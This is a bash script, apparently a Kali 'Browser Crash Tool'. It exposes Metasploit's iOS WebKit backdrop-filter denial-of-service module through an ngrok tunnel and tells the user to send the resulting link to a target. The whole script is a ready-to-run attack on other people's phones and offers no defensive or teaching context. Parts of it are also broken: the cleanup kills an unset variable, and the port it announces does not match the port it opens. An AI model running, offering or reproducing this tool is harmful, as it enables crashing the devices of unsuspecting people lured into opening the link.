#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Title and banner
clear
echo -e "${BLUE}============================================${NC}"
echo -e "${BLUE}         Browser Crash Tool - Kali           ${NC}"
echo -e "${BLUE}============================================${NC}"
echo -e "${YELLOW}This tool uses Metasploit to exploit a vulnerability in iOS WebKit.${NC}"
echo -e "${YELLOW}Ensure you have Metasploit and Ngrok installed!${NC}"
echo -e ""

# Function to clean up ngrok process
get_ngrok_pid() {
    local pid
    pid=$(pgrep -f ngrok)
}

# Define the command to execute on Ctrl+C
on_interrupt() {
    echo "Ctrl+C detected. Executing command..."
    # Replace this with the command you want to execute
    kill -9 $pid
}

# Check if Metasploit is installed
if ! command -v msfconsole &> /dev/null
then
    echo -e "${RED}[ERROR] Metasploit is not installed. Please install it and try again.${NC}"
    exit 1
fi

# Check if Ngrok is installed
if ! command -v ngrok &> /dev/null
then
    echo -e "${RED}[ERROR] Ngrok is not installed. Installing Ngrok...${NC}"
    sudo apt-get install ngrok -y
fi

# Start Ngrok to get a public URL
echo -e "${YELLOW}[INFO] Starting Ngrok on port 80...${NC}"
ngrok http 443 > /dev/null &
NGROK_PID=$!
sleep 5

# Get the public Ngrok URL
NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | grep -oP '(?<=public_url":")https://[^"]+')
if [ -z "$NGROK_URL" ]; then
    echo -e "${RED}[ERROR] Failed to get Ngrok URL.${NC}"
    exit 1
fi

# Inform the user
echo -e "${GREEN}[INFO] The browser crash is live! Send the following link to the target:${NC}"
echo -e "      ${CYAN}$NGROK_URL/${NC}"
echo -e "${GREEN}[INFO] Press Ctrl+C to stop.${NC}"

# Launch Metasploit with the WebKit module in the background
echo -e "${YELLOW}[INFO] Launching Metasploit to exploit WebKit vulnerability...${NC}"
(
  msfconsole -q -x "use auxiliary/dos/apple_ios/webkit_backdrop_filter_blur;set SRVPORT 443; set ssl true; set URIPATH /;exploit"
)

# Wait for Metasploit to start
sleep 10


# Set up the trap to catch Ctrl+C (SIGINT) and call the on_interrupt function
trap 'on_interrupt' INT


